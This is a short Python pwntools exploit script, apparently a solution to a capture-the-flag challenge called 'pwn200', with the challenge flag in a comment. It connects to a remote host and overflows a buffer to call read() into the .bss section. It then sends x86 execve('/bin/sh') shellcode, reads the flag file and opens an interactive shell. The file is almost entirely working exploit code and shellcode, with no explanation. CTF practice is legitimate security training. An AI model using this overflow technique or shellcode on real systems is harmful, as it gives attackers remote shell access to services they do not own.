#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

# Bugs_Bunny{Its_all_about_where_We_Can_Put_Our_Shell:D!}

host , port = '54.153.19.139' , 5254
#host , port = '192.168.78.133' , 4000
y = remote( host , port )

e = ELF('pwn200')

p = 'D' * 0x18
p += 'EBBP'
p += p32( e.plt['read'] )
p += p32( e.bss() + 0x10 )
p += p32( 0x0 )
p += p32( e.bss() + 0x10 )
p += p32( 0x70 )

y.send( p )

sc = 'jhh///sh/binj\x0bX\x89\xe31\xc9\x99\xcd\x80'

sleep( 0.7 )

y.send( sc )

y.sendline( 'cat /home/`whoami`/flag' )


y.interactive()